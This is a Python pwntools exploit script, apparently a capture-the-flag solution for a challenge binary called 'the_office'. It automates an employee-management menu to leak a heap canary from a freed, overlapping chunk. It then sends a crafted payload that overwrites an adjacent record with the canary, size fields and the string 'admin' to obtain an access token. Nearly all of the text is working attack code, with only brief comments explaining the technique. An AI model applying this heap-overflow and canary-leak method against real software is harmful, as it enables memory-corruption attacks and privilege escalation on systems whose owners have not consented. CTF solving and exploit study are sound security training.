from pwn import *

SIZEOF_EMPLOYEE = 0x40

def add_employee(name=b"AAAA", salary=0xdeadbeef, phone=b"BBBB", email=None, bldg=None):
    r.sendline(b'1')
    r.recvuntil(b'Name: ')
    r.sendline(name)
    r.recvuntil(b'Email (y/n)? ')
    if email:
        r.sendline(b'y')
        r.recvuntil(b'Email address: ')
        r.sendline(email)
    else:
        r.sendline(b'n')
    r.recvuntil(b'Salary: ')
    r.sendline(str(salary).encode())
    r.recvuntil(b'Phone #: ')
    r.sendline(phone)
    r.recvuntil(b'Bldg (y/n)? ')
    if bldg:
        r.sendline(b'y')
        r.recvuntil(b'Bldg #: ')
        r.sendline(str(bldg).encode())
    else:
        r.sendline(b'n')
    r.recvuntil(b'4) Get access token\n')

def remove_employee(i):
    r.sendline(b'2')
    r.recvuntil(b'Employee #?\n')
    r.sendline(str(i).encode())
    r.recvuntil(b'4) Get access token\n')

def list_employees():
    r.sendline(b'3')
    return r.recvuntil(b'4) Get access token\n')
   
def get_access_token(i):
    r.sendline(b'4')
    r.recvuntil(b'Employee #?\n')
    r.sendline(str(i).encode())
    # return r.recvuntil(b'4) Get access token\n')
    return r.recvall()


if args['REMOTE']:
    r = remote(args['HOST'], int(args['PORT']))
else:
    r = process("./the_office")

r.recvuntil(b'4) Get access token\n')

log.info("Leak canary")
# We abuse the fact that canaries are not wiped after freeing, so if have a new chunk that overlaps an old one,
# we can leak it e.g. via the building number.
add_employee(email=b"C"*0x70)
remove_employee(0)

add_employee(email=b"C" * (0x70 - SIZEOF_EMPLOYEE + 0x10))
add_employee()

leak = list_employees().decode()
canary = int(leak.split('Employee 1:')[1].split('Bldg #: ')[1].split('\n')[0])
log.info(f"leak: 0x{canary:x}")

log.info("Clean up for next stage")
remove_employee(1)
remove_employee(0)

log.info("Do overwrite")
add_employee()
add_employee()
remove_employee(0)
payload = b'X' * 0x1c + p32(canary) + p32(0x35) + p32(0x35) + b'admin'
add_employee(phone=payload)

log.info("Get flag")
x = get_access_token(1)
log.info(x.decode())
